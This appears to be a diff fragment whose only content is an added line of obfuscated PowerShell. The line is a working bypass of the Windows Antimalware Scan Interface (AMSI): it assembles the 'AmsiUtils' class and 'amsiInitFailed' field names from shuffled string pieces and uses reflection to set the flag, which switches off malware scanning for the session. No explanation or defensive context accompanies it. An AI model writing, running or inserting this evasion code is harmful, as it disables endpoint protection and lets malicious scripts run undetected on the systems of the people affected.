@@ -1,0 +1,1 @@
+Set-Item('Variable:4ms1_byp4ss_99317')([Type]('ref'));(Get-Variable('4ms1_byp4ss_99317') -val).Assembly.GetType(("{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System')).GetfiElD(("{0}{2}{1}" -f'ams','d','iInitFaile'),('NonPublic,Static')).SetValue(${null},${true})
